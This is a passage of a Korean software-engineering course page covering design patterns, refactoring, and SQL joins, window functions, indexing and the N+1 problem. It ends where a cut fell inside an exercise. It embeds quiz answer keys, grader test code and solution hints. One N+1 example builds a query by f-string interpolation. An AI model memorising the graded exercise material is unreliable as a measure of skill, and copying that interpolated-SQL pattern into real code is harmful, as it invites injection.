+<p>핵심은 <code>TaskManager</code>가 어떤 백엔드를 사용하는지 알지도 신경 쓰지도 않는다는 점입니다. 비즈니스 로직을 전혀 수정하지 않고도 인메모리에서 SQLite, 클라우드 데이터베이스로 교체할 수 있습니다.</p>
+
+<h4>커맨드 패턴 (Command Pattern)</h4>
+
+<p><strong>커맨드(Command)</strong> 패턴은 요청을 객체로 캡슐화하여 실행 취소/다시 실행, 큐잉(queueing), 작업 로깅을 가능하게 합니다.</p>
+
+<pre style="overflow-x:auto"><code>class Command(ABC):
+    @abstractmethod
+    def execute(self): pass
+
+    @abstractmethod
+    def undo(self): pass
+
+class AddTaskCommand(Command):
+    def __init__(self, manager, task_id, title):
+        self.manager = manager
+        self.task_id = task_id
+        self.title = title
+
+    def execute(self):
+        self.manager.add_task(self.task_id, self.title)
+
+    def undo(self):
+        self.manager.remove_task(self.task_id)
+
+class CommandHistory:
+    def __init__(self):
+        self._history = []
+
+    def execute(self, command):
+        command.execute()
+        self._history.append(command)
+
+    def undo_last(self):
+        if self._history:
+            cmd = self._history.pop()
+            cmd.undo()</code></pre>
+
+<h3>의존성 주입의 실제 적용</h3>
+
+<p><strong>의존성 주입(Dependency Injection, DI)</strong>은 클래스 내부에서 의존성을 생성하는 대신 외부에서 전달하는 관행입니다. DIP에서 이미 살펴봤습니다. Python에서는 DI 프레임워크가 거의 필요하지 않으며, 생성자 주입으로 충분한 경우가 대부분입니다.</p>
+
+<pre style="overflow-x:auto"><code># WITHOUT DI: tightly coupled, untestable
+class OrderProcessor:
+    def __init__(self):
+        self.payment = StripePayment()  # Hard-coded!
+        self.email = SendGridEmail()    # Hard-coded!
+
+# WITH DI: loosely coupled, easily testable
+class OrderProcessor:
+    def __init__(self, payment, email):
+        self.payment = payment  # Injected
+        self.email = email      # Injected
+
+# Production
+processor = OrderProcessor(StripePayment(), SendGridEmail())
+# Testing
+test_proc = OrderProcessor(MockPayment(), MockEmail())</code></pre>
+
+<h3>리팩터링 패턴과 코드 스멜 (Code Smell)</h3>
+
+<p><strong>코드 스멜(code smell)</strong>은 더 깊은 문제가 있을 수 있음을 나타내는 표면적 징후입니다. 가장 흔한 스멜과 그 해결책을 정리합니다.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>흔한 코드 스멜과 리팩터링 해결책</caption>
+<thead><tr><th>코드 스멜</th><th>증상</th><th>리팩터링</th></tr></thead>
+<tbody>
+<tr><td><strong>갓 클래스 (God Class)</strong></td><td>클래스 하나가 모든 것을 담당(500줄 이상, 메서드 20개 이상)</td><td>클래스 추출 — 역할별 컴포넌트로 분리</td></tr>
+<tr><td><strong>기능 편애 (Feature Envy)</strong></td><td>메서드가 자신의 데이터보다 다른 클래스의 데이터를 더 많이 사용</td><td>메서드 이동 — 속하는 클래스로 재배치</td></tr>
+<tr><td><strong>산탄총 수술 (Shotgun Surgery)</strong></td><td>변경 하나에 여러 파일 수정 필요</td><td>메서드 이동 / 클래스 추출 — 관련 로직 통합</td></tr>
+<tr><td><strong>긴 메서드 (Long Method)</strong></td><td>메서드가 20~30줄 초과하거나 여러 일을 처리</td><td>메서드 추출 — 더 작고 이름이 있는 단계로 분해</td></tr>
+<tr><td><strong>기본 타입 집착 (Primitive Obsession)</strong></td><td>소형 값 객체 대신 날 문자열/정수 사용</td><td>값 객체로 대체 (예: 날 문자열 대신 <code>Email</code> 클래스)</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>메서드 추출(Extract Method)</strong>은 가장 흔한 리팩터링입니다. 하나의 일관된 일을 하는 코드 블록을 가져다가 설명적인 이름을 붙이고 함수로 만드는 것입니다.</p>
+
+<pre style="overflow-x:auto"><code># Before: one large function doing four things
+def process_order(order):
+    if not order.get("items"):
+        raise ValueError("No items")
+    if order["total"] &lt; 0:
+        raise ValueError("Negative total")
+    tax = order["total"] * 0.08
+    order["tax"] = tax
+    order["grand_total"] = order["total"] + tax
+    db.save(order)
+    email.send(order["customer"], f"Confirmed: ${order['grand_total']}")
+
+# After: each step has a clear name
+def process_order(order):
+    validate_order(order)
+    apply_tax(order)
+    db.save(order)
+    notify_customer(order)
+
+def validate_order(order):
+    if not order.get("items"):
+        raise ValueError("No items")
+    if order["total"] &lt; 0:
+        raise ValueError("Negative total")
+
+def apply_tax(order, rate=0.08):
+    order["tax"] = order["total"] * rate
+    order["grand_total"] = order["total"] + order["tax"]
+
+def notify_customer(order):
+    email.send(order["customer"], f"Confirmed: ${order['grand_total']}")</code></pre>
+
+<p><strong>조건부를 다형성으로 대체(Replace Conditional with Polymorphism)</strong>는 타입 필드를 기반으로 긴 <code>if/elif</code> 체인이 있을 때 특히 강력합니다. 위에서 OCP로 수정한 내용이 바로 이것입니다.</p>
+
+<p><strong>스트랭글러 무화과 패턴(Strangler Fig Pattern)</strong>은 대규모 리팩터링에 적합합니다. 시스템을 처음부터 재작성하는 대신, 이전 시스템 옆에 새 시스템을 점진적으로 구축하면서 이전 시스템이 완전히 대체될 때까지 트래픽을 새 코드로 조금씩 전환합니다. 이름은 숙주 나무를 감싸며 자라다가 결국 대체하는 스트랭글러 무화과나무에서 유래했습니다.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge 연결</div>
+<p>TaskForge를 전략 패턴으로 스토리지를 사용하도록 리팩터링하십시오. <code>StorageBackend</code> 추상 기반 클래스를 만들고 <code>DictBackend</code>(빠른 테스트용)와 <code>SQLiteBackend</code>(프로덕션용) 두 가지를 구현하십시오. <code>TaskManager</code>가 생성자 주입을 통해 어떤 백엔드든 받을 수 있어야 합니다. 이 단 하나의 변경으로 TaskForge의 테스트 용이성이 크게 향상됩니다.</p>
+</div>
+
+<div class="pq">"작동하게 만들고, 올바르게 만들고, 빠르게 만들라 — 그 순서대로." &mdash; Kent Beck</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">직접 해보기 &mdash; 스멜 찾기</div>
+<p>TaskForge 코드베이스를 살펴보십시오. 갓 클래스(너무 많은 일을 하는 파일이나 클래스)를 하나 찾아보십시오. 어떤 책임을 분리할 수 있는지 적어 보십시오. 아직 리팩터링할 필요는 없습니다. 스멜을 식별하는 연습을 합니다.</p>
+</div>
+
+<!-- Ch28 Quiz -->
+<div class="quiz" data-ch="28" data-ex="solid-violation">
+  <h4>핵심 개념 확인</h4>
+  <p><code>UserManager</code>라는 클래스가 사용자 등록, 비밀번호 해싱, 환영 이메일 발송, 분석 보고서 생성을 모두 처리합니다. 이 클래스가 가장 명확하게 위반하는 SOLID 원칙은 무엇입니까?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="true">단일 책임 원칙 — 클래스에 변경 이유가 여러 개 있습니다</button>
+    <button class="quiz-option" data-correct="false">개방/폐쇄 원칙 — 확장 가능하지 않습니다</button>
+    <button class="quiz-option" data-correct="false">리스코프 치환 원칙 — 하위 타입이 대체할 수 없습니다</button>
+    <button class="quiz-option" data-correct="false">의존성 역전 원칙 — 구체 클래스에 의존합니다</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch28 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="28" data-ex="strategy-pattern">
+  <div class="exercise-header">
+    <h4>연습: 전략 패턴 구현</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt">추상 메서드 <code>save(key, value)</code>, <code>load(key)</code>, <code>list_all()</code>를 가진 <code>StorageBackend</code> 기반 클래스를 만드십시오. 그런 다음 <code>DictStorage</code>(딕셔너리에 저장)와 <code>ListStorage</code>(튜플 리스트에 저장)를 구현하십시오. 마지막으로 생성자에서 어떤 백엔드든 받을 수 있는 <code>TaskManager</code> 클래스를 만드십시오. <code>add_task(task_id, title)</code>는 <code>{"title": title}</code>을 저장하고, <code>get_task(task_id)</code>는 이를 불러와야 합니다.</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+from abc import ABC, abstractmethod
+
+class StorageBackend(ABC):
+    @abstractmethod
+    def save(self, key, value):
+        pass
+
+    @abstractmethod
+    def load(self, key):
+        pass
+
+    @abstractmethod
+    def list_all(self):
+        pass
+
+class DictStorage(StorageBackend):
+    # TODO: implement using a dict
+    pass
+
+class ListStorage(StorageBackend):
+    # TODO: implement using a list of (key, value) tuples
+    pass
+
+class TaskManager:
+    # TODO: accept a backend, implement add_task and get_task
+    pass
+    </script>
+    <script type="text/plain" class="test-code">
+# Test DictStorage
+ds = DictStorage()
+ds.save("t1", {"title": "Buy milk"})
+ds.save("t2", {"title": "Fix bug"})
+assert ds.load("t1") == {"title": "Buy milk"}, "DictStorage load failed"
+assert ds.load("t2") == {"title": "Fix bug"}, "DictStorage load t2 failed"
+assert len(ds.list_all()) == 2, "DictStorage list_all should return 2 items"
+
+# Test ListStorage
+ls = ListStorage()
+ls.save("t1", {"title": "Buy milk"})
+ls.save("t2", {"title": "Fix bug"})
+assert ls.load("t1") == {"title": "Buy milk"}, "ListStorage load failed"
+assert ls.load("t2") == {"title": "Fix bug"}, "ListStorage load t2 failed"
+assert len(ls.list_all()) == 2, "ListStorage list_all should return 2 items"
+
+# Test TaskManager with DictStorage
+tm_dict = TaskManager(DictStorage())
+tm_dict.add_task("a1", "Write docs")
+assert tm_dict.get_task("a1") == {"title": "Write docs"}, "TaskManager+DictStorage failed"
+
+# Test TaskManager with ListStorage
+tm_list = TaskManager(ListStorage())
+tm_list.add_task("b1", "Deploy app")
+assert tm_list.get_task("b1") == {"title": "Deploy app"}, "TaskManager+ListStorage failed"
+
+# Verify both backends are interchangeable
+assert isinstance(tm_dict._backend, StorageBackend), "Backend must inherit StorageBackend"
+assert isinstance(tm_list._backend, StorageBackend), "Backend must inherit StorageBackend"
+print("All Strategy pattern tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">실행</button>
+    <button class="ex-check">확인</button>
+    <button class="ex-hint" data-level="0">힌트</button>
+    <button class="ex-reset">초기화</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">DictStorage: __init__에서 self._store = {}를 사용하십시오. save()는 self._store[key] = value를 설정합니다. load()는 self._store.get(key)를 반환합니다. list_all()은 list(self._store.values())를 반환합니다.</p>
+    <p class="hint">ListStorage: __init__에서 self._store = []를 사용하십시오. save()는 (key, value)를 추가합니다. load()는 리스트를 순회하여 일치하는 키를 찾습니다. list_all()은 [v for _, v in self._store]를 반환합니다.</p>
+    <p class="hint">TaskManager.__init__은 backend 매개변수를 받아 self._backend로 저장합니다. add_task는 self._backend.save(task_id, {"title": title})을 호출합니다. get_task는 self._backend.load(task_id)를 호출합니다.</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 29 ===== -->
+<section id="ch29" data-ch="29">
+<h2><span class="ch-label">Chapter 29</span> SQL과 쿼리 마스터</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">지금 이것이 중요한 이유</div>
+<p>15장에서는 테이블 생성과 기본 쿼리 작성에 충분한 SQL을 배웠습니다. 실제 세계에서는 수백만 행의 데이터, 복잡한 관계, 성능 요구 사항이 있는 데이터베이스를 만나게 됩니다. 이 장은 "SELECT를 쓸 수 있다"에서 "효율적이고 복잡한 쿼리를 작성하고 그것이 왜 그렇게 동작하는지 이해한다"로 이끌어 줍니다.</p>
+</div>
+
+<h3>JOIN &mdash; 테이블 연결하기</h3>
+
+<p>실제 데이터베이스는 중복을 피하기 위해 데이터를 여러 테이블에 분산합니다(정규화, normalisation). <strong>JOIN</strong>은 쿼리에서 그 데이터를 다시 연결하는 방법입니다. 다양한 JOIN 유형을 이해하는 것이 필수적입니다.</p>
+
+<h4>INNER JOIN</h4>
+
+<p><em>두</em> 테이블 모두에서 일치하는 행만 반환합니다. 태스크에 카테고리가 없으면 완전히 제외됩니다.</p>
+
+<pre style="overflow-x:auto"><code>-- Tasks with their category names (only matched rows)
+SELECT tasks.title, categories.name AS category
+FROM tasks
+INNER JOIN categories ON tasks.category_id = categories.id;</code></pre>
+
+<p>INNER JOIN을 두 집합의 교집합으로 생각하십시오. 일치하는 쌍만 결과에 나타납니다.</p>
+
+<h4>LEFT OUTER JOIN</h4>
+
+<p>오른쪽 테이블에 일치하는 항목이 없어도 <em>왼쪽</em> 테이블의 모든 행을 반환합니다. 오른쪽 테이블에서 일치하지 않는 컬럼은 NULL이 됩니다.</p>
+
+<pre style="overflow-x:auto"><code>-- ALL tasks, including those without a category
+SELECT tasks.title, categories.name AS category
+FROM tasks
+LEFT JOIN categories ON tasks.category_id = categories.id;
+
+-- Result includes:
+-- "Fix login bug"    | "Bugs"
+-- "Unassigned task"  | NULL    &larr; no category, still included</code></pre>
+
+<h4>CROSS JOIN</h4>
+
+<p><strong>카르테시안 곱(Cartesian product)</strong>을 반환합니다. 첫 번째 테이블의 모든 행과 두 번째 테이블의 모든 행을 조합합니다. 테이블 A에 3개 행, 테이블 B에 4개 행이 있으면 결과는 12개 행입니다. 거의 필요하지 않지만 가능한 모든 조합을 생성할 때 유용합니다.</p>
+
+<pre style="overflow-x:auto"><code>-- Every task paired with every user (for scheduling matrix)
+SELECT tasks.title, users.name
+FROM tasks
+CROSS JOIN users;</code></pre>
+
+<h4>셀프 조인 (Self-Join)</h4>
+
+<p>테이블을 자기 자신과 조인합니다. 서브태스크가 있는 태스크와 같은 계층적 데이터에 유용합니다.</p>
+
+<pre style="overflow-x:auto"><code>-- Find tasks and their parent tasks
+SELECT child.title AS subtask, parent.title AS parent_task
+FROM tasks AS child
+INNER JOIN tasks AS parent ON child.parent_id = parent.id;</code></pre>
+
+<h3>서브쿼리와 CTE</h3>
+
+<h4>서브쿼리 (Subquery)</h4>
+
+<p><strong>서브쿼리(subquery)</strong>는 다른 쿼리 안에 중첩된 쿼리입니다. <strong>비상관 서브쿼리(uncorrelated subquery)</strong>는 독립적으로 한 번 실행됩니다. <strong>상관 서브쿼리(correlated subquery)</strong>는 외부 쿼리의 행마다 한 번씩 실행되므로 느리지만 때로는 필요합니다.</p>
+
+<pre style="overflow-x:auto"><code>-- Uncorrelated: find tasks with above-average priority score
+SELECT title, priority_score
+FROM tasks
+WHERE priority_score &gt; (SELECT AVG(priority_score) FROM tasks);
+
+-- Correlated: find each user's most recent task
+SELECT t.title, t.created_at, t.user_id
+FROM tasks t
+WHERE t.created_at = (
+    SELECT MAX(t2.created_at)
+    FROM tasks t2
+    WHERE t2.user_id = t.user_id  -- References outer query
+);</code></pre>
+
+<h4>공통 테이블 식 (Common Table Expression, CTE)</h4>
+
+<p><strong>CTE</strong>는 <code>WITH</code> 절을 사용하여 임시 명명된 결과 집합을 정의합니다. CTE는 복잡한 쿼리를 논리적 단계로 나누어 읽기 쉽게 만들어 줍니다.</p>
+
+<pre style="overflow-x:auto"><code>-- Find categories with more than 5 high-priority tasks
+WITH high_priority AS (
+    SELECT category_id, COUNT(*) AS cnt
+    FROM tasks
+    WHERE priority = 'high'
+    GROUP BY category_id
+)
+SELECT categories.name, high_priority.cnt
+FROM high_priority
+INNER JOIN categories ON high_priority.category_id = categories.id
+WHERE high_priority.cnt &gt; 5;</code></pre>
+
+<p>CTE는 중첩된 서브쿼리보다 훨씬 읽기 쉽고, 메인 쿼리에서 동일한 CTE를 여러 번 참조할 수 있습니다.</p>
+
+<h3>윈도우 함수 (Window Functions)</h3>
+
+<p><strong>윈도우 함수(window function)</strong>는 <code>GROUP BY</code>처럼 결과를 축소하지 <em>않으면서</em> 현재 행과 관련된 행 집합에 걸쳐 계산을 수행합니다. 현대 SQL에서 가장 강력한 기능 중 하나입니다.</p>
+
+<pre style="overflow-x:auto"><code>-- ROW_NUMBER: sequential number within each category
+SELECT title, category_id, priority_score,
+       ROW_NUMBER() OVER (
+           PARTITION BY category_id
+           ORDER BY priority_score DESC
+       ) AS rank_in_category
+FROM tasks;
+
+-- RANK: ties get the same rank (with gaps after)
+SELECT title, priority_score,
+       RANK() OVER (ORDER BY priority_score DESC) AS rank
+FROM tasks;
+
+-- LAG / LEAD: access the previous/next row's value
+SELECT title, created_at,
+       LAG(created_at) OVER (ORDER BY created_at) AS prev_date
+FROM tasks;</code></pre>
+
+<p><code>OVER</code> 절이 윈도우를 정의합니다. <code>PARTITION BY</code>는 행을 그룹으로 나누고(GROUP BY처럼 축소하지 않음), <code>ORDER BY</code>는 각 파티션 내의 정렬 순서를 정의합니다.</p>
+
+<h3>인덱싱 &mdash; 쿼리 빠르게 만들기</h3>
+
+<p>인덱스가 없으면 모든 쿼리가 전체 테이블을 스캔합니다("전체 테이블 스캔(full table scan)"). <strong>인덱스(index)</strong>는 데이터베이스가 모든 것을 스캔하지 않고 행을 찾을 수 있게 하는 별도의 자료 구조(data structure)입니다. 교과서 뒤의 색인(索引)으로 생각하십시오.</p>
+
+<h4>B-트리 인덱스 (B-Tree Index)</h4>
+
+<p>가장 흔한 인덱스 유형은 <strong>B-트리(balanced tree, 균형 트리)</strong>입니다. 키를 트리 구조에 정렬해서 저장하며, 각 노드가 값의 범위를 가리킵니다. 값을 조회하는 데 O(n) 대신 O(log n)이 소요됩니다.</p>
+
+<!-- B-tree SVG Diagram -->
+<svg viewBox="0 0 700 310" aria-label="B-tree index structure showing how TaskForge task IDs are organized in a tree for efficient lookup. Root node contains keys 20 and 40, branching to leaf nodes containing task ID ranges." style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <!-- Root node -->
+  <rect x="265" y="10" width="170" height="44" rx="6" class="node-accent" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="37" class="label-text" text-anchor="middle" font-size="14" font-weight="600">20 | 40</text>
+
+  <!-- Level 2 nodes -->
+  <rect x="60" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="135" y="122" class="label-text" text-anchor="middle" font-size="13">5 | 10 | 15</text>
+
+  <rect x="275" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="350" y="122" class="label-text" text-anchor="middle" font-size="13">25 | 30 | 35</text>
+
+  <rect x="490" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="565" y="122" class="label-text" text-anchor="middle" font-size="13">45 | 50 | 55</text>
+
+  <!-- Leaf nodes -->
+  <rect x="12" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="50" y="215" class="sub-text" text-anchor="middle" font-size="10">1,2,3,4</text>
+
+  <rect x="98" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="136" y="215" class="sub-text" text-anchor="middle" font-size="10">6,7,8,9</text>
+
+  <rect x="184" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="222" y="215" class="sub-text" text-anchor="middle" font-size="10">11..14</text>
+
+  <rect x="290" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="328" y="215" class="sub-text" text-anchor="middle" font-size="10">21..24</text>
+
+  <rect x="376" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="414" y="215" class="sub-text" text-anchor="middle" font-size="10">26..29</text>
+
+  <rect x="492" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="530" y="215" class="sub-text" text-anchor="middle" font-size="10">31..34</text>
+
+  <!-- Arrows root to level 2 -->
+  <line x1="300" y1="54" x2="175" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="350" y1="54" x2="350" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="400" y1="54" x2="525" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <!-- Arrows level 2 to leaves -->
+  <line x1="100" y1="139" x2="55" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="135" y1="139" x2="133" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="175" y1="139" x2="218" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+
+  <line x1="315" y1="139" x2="325" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="350" y1="139" x2="410" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="385" y1="139" x2="525" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+
+  <!-- Search path highlight -->
+  <text x="350" y="260" class="sub-text" text-anchor="middle" font-size="12" fill="var(--accent)" font-weight="500">Lookup task #27: Root &rarr; middle child &rarr; leaf &rarr; found!</text>
+  <text x="350" y="280" class="sub-text" text-anchor="middle" font-size="11">Only 3 node reads instead of scanning all 55 rows</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>-- Single-column index on the column you filter by most
+CREATE INDEX idx_tasks_priority ON tasks(priority);
+
+-- Composite index: useful when filtering by both columns together
+CREATE INDEX idx_tasks_cat_priority ON tasks(category_id, priority);
+
+-- Column order matters! This index helps:
+--   WHERE category_id = 5 AND priority = 'high'  (both columns)
+--   WHERE category_id = 5                         (leftmost column)
+-- But NOT:
+--   WHERE priority = 'high'  (can't skip the first column)</code></pre>
+
+<h4>커버링 인덱스 (Covering Index)</h4>
+
+<p><strong>커버링 인덱스(covering index)</strong>는 쿼리에 필요한 모든 컬럼을 포함하므로, 데이터베이스가 메인 테이블에 접근하지 않고 인덱스만으로 쿼리에 응답합니다.</p>
+
+<pre style="overflow-x:auto"><code>-- If this is your most common query:
+SELECT title, priority FROM tasks WHERE category_id = 5;
+
+-- This covering index answers it without touching the table:
+CREATE INDEX idx_covering ON tasks(category_id, title, priority);</code></pre>
+
+<h4>인덱스가 해가 되는 경우</h4>
+
+<p>인덱스는 공짜가 아닙니다. 모든 인덱스는 INSERT, UPDATE, DELETE 작업에 오버헤드를 추가하고(인덱스도 업데이트해야 하므로) 스토리지를 소비합니다. 읽기가 드문 쓰기 집약적인 테이블에서는 인덱스가 너무 많으면 오히려 속도가 느려질 수 있습니다. 무분별하게 인덱스를 추가하기 전에 프로파일링을 하십시오.</p>
+
+<h3>쿼리 최적화</h3>
+
+<h4>EXPLAIN &mdash; 쿼리 계획 읽기</h4>
+
+<p><code>EXPLAIN</code> 명령어는 데이터베이스가 쿼리를 <em>어떻게</em> 실행할지 보여 줍니다.</p>
+
+<pre style="overflow-x:auto"><code>EXPLAIN QUERY PLAN
+SELECT tasks.title, categories.name
+FROM tasks
+INNER JOIN categories ON tasks.category_id = categories.id
+WHERE tasks.priority = 'high';
+
+-- Output might show:
+-- SCAN TABLE tasks           &larr; Full table scan! No index on priority
+-- SEARCH TABLE categories USING INTEGER PRIMARY KEY  &larr; Good, using PK</code></pre>
+
+<p><strong>SCAN</strong>(큰 테이블에서는 나쁨 — 모든 행을 읽음)과 <strong>SEARCH</strong> 또는 <strong>USING INDEX</strong>(좋음 — 인덱스 사용)를 찾으십시오. WHERE 절이 있는 큰 테이블에서 SCAN이 보이면 인덱스가 필요할 가능성이 높습니다.</p>
+
+<div role="note" class="callout warn">
+<div class="callout-title">주의: EXPLAIN 출력 읽기는 매일 쓰는 기술입니다</div>
+<p>프로덕션에서 느린 쿼리는 애플리케이션 다운타임의 가장 흔한 원인 중 하나입니다. EXPLAIN을 실행하고, 출력을 해석하고, 올바른 인덱스를 추가하는 능력은 상시 사용하게 됩니다. 이 절을 건너뛰지 마십시오 — 작성하는 모든 쿼리에서 연습하십시오.</p>
+</div>
+
+<h4>N+1 문제</h4>
+
+<p><strong>N+1 문제</strong>는 코드가 목록을 가져오기 위해 쿼리 하나를 실행한 다음, 각 항목의 관련 데이터를 가져오기 위해 N개의 추가 쿼리를 실행할 때 발생합니다. 매우 흔하고 매우 낭비적입니다.</p>
+
+<pre style="overflow-x:auto"><code># THE N+1 PROBLEM
+# 1 query to get all categories
+categories = db.execute("SELECT * FROM categories").fetchall()
+
+for cat in categories:
+    # N queries, one per category!
+    tasks = db.execute(
+        "SELECT * FROM tasks WHERE category_id = ?", (cat["id"],)
+    ).fetchall()
+    print(f"{cat['name']}: {len(tasks)} tasks")
+
+# If there are 100 categories, that's 101 total queries!
+
+# THE FIX: single JOIN query
+results = db.execute("""
+    SELECT categories.name, COUNT(tasks.id) AS task_count
+    FROM categories
+    LEFT JOIN tasks ON tasks.category_id = categories.id
+    GROUP BY categories.id
+""").fetchall()
+# 1 query instead of 101!</code></pre>
+
+<h3>정규화 (Normalisation)</h3>
+
+<p><strong>정규화(normalisation)</strong>는 중복을 줄이기 위해 데이터를 구성합니다. 여러 "정규형(normal form)"이 있으며, 각각이 이전 것을 기반으로 합니다.</p>
+
+<p><strong>제1정규형 (1NF):</strong> 모든 컬럼은 원자적(단일) 값을 포함합니다. 리스트나 반복 그룹은 없습니다.</p>
+
+<pre style="overflow-x:auto"><code>-- VIOLATES 1NF: tags column contains a comma-separated list
+-- | id | title    | tags              |
+-- | 1  | Fix bug  | "urgent,security" |
+
+-- 1NF FIX: separate table for tags
+-- tasks: | id | title   |
+-- tags:   | id | task_id | tag      |
+--         | 1  | 1       | urgent   |
+--         | 2  | 1       | security |</code></pre>
+
+<p><strong>제2정규형 (2NF):</strong> 1NF를 만족하며, 모든 비키 컬럼이 기본 키 <em>전체</em>에 의존합니다(복합 키에 관련).</p>
+
+<p><strong>제3정규형 (3NF):</strong> 2NF를 만족하며, 비키 컬럼이 다른 비키 컬럼에 의존하지 않습니다(이행적 의존성 없음).</p>
+
+<pre style="overflow-x:auto"><code>-- VIOLATES 3NF: city depends on zip_code, not on the primary key
+-- | user_id | name  | zip_code | city     |
+
+-- 3NF FIX: separate zip_codes table
+-- users:     | user_id | name  | zip_code |
+-- zip_codes: | zip_code | city            |</code></pre>
+
+<p><strong>역정규화(denormalise) 시점:</strong> 읽기 집약적인 분석 및 보고 쿼리는 비용이 큰 JOIN을 피하기 위해 중복 데이터를 저장하는 것이 이득일 수 있습니다. 이는 의도적인 트레이드오프로, 더 빠른 읽기를 위해 더 복잡한 쓰기와 잠재적인 데이터 불일치를 감수합니다.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge 연결</div>
+<p>TaskForge 데이터베이스에 인덱스를 추가하십시오: <code>tasks.priority</code> 인덱스, <code>tasks(category_id, priority)</code> 복합 인덱스, 가장 자주 사용하는 쿼리를 위한 커버링 인덱스. 전후를 비교하기 위해 <code>EXPLAIN QUERY PLAN</code>을 실행하십시오. 또한 API 라우트에서 N+1 쿼리를 찾아 수정하십시오.</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">직접 해보기 &mdash; N+1 찾기</div>
+<p>이 의사 코드에서 N+1 문제를 찾으십시오.</p>
+<pre style="overflow-x:auto"><code>users = db.query("SELECT * FROM users")
+for user in users:
+    tasks = db.query(f"SELECT * FROM tasks WHERE user_id = {user.id}")
+    user.task_count = len(tasks)</code></pre>
+<p>이를 대체하는 단일 JOIN 쿼리를 작성하십시오.</p>
+<pre style="overflow-x:auto"><code>SELECT users.*, COUNT(tasks.id) AS task_count
+FROM users
+LEFT JOIN tasks ON tasks.user_id = users.id
+GROUP BY users.id</code></pre>
+</div>
+
+<!-- Ch29 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="29" data-ex="sql-joins-windows">
+  <div class="exercise-header">
+    <h4>연습: SQL JOIN과 윈도우 함수</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt">Python의 <code>sqlite3</code>를 사용하여 테이블을 만들고 데이터를 삽입한 다음, JOIN과 윈도우 함수를 사용하는 쿼리를 작성하십시오. 각 함수가 올바른 결과를 반환하도록 완성하십시오.</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import sqlite3
+
+def setup_database():
+    """Create tables and insert sample data. Return the connection."""
+    conn = sqlite3.connect(":memory:")
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    c.execute("""CREATE TABLE categories (
+        id INTEGER PRIMARY KEY, name TEXT NOT NULL
+    )""")
+    c.execute("""CREATE TABLE tasks (
+        id INTEGER PRIMARY KEY, title TEXT NOT NULL,
+        priority INTEGER DEFAULT 3, category_id INTEGER,
+        FOREIGN KEY (category_id) REFERENCES categories(id)
+    )""")
+    c.executemany("INSERT INTO categories (id, name) VALUES (?, ?)", [
+        (1, "Bugs"), (2, "Features"), (3, "Docs")
+    ])
+    c.executemany(
+        "INSERT INTO tasks (id, title, priority, category_id) VALUES (?, ?, ?, ?)", [
+        (1, "Fix login crash", 5, 1),
+        (2, "Add dark mode", 3, 2),
+        (3, "Update README", 2, 3),
+        (4, "Fix timeout bug", 4, 1),
+        (5, "Search feature", 4, 2),
+        (6, "Orphan task", 3, None),
+    ])
+    conn.commit()
+    return conn
+
+def query_inner_join(conn):
+    """Return list of (title, category_name) for tasks WITH a category.
+    Use INNER JOIN. Should return 5 rows (orphan excluded)."""
+    # TODO
+    pass
+
+def query_left_join(conn):
+    """Return list of (title, category_name) for ALL tasks.
+    Tasks without a category should have None for category_name.
+    Should return 6 rows."""
+    # TODO
+    pass
+
+def query_window_rank(conn):
+    """Return list of (title, category_id, priority, rank_in_category).
+    Rank by priority DESC within each category using ROW_NUMBER().
+    Only include tasks that HAVE a category."""
+    # TODO
+    pass
+
+conn = setup_database()
+    </script>
+    <script type="text/plain" class="test-code">
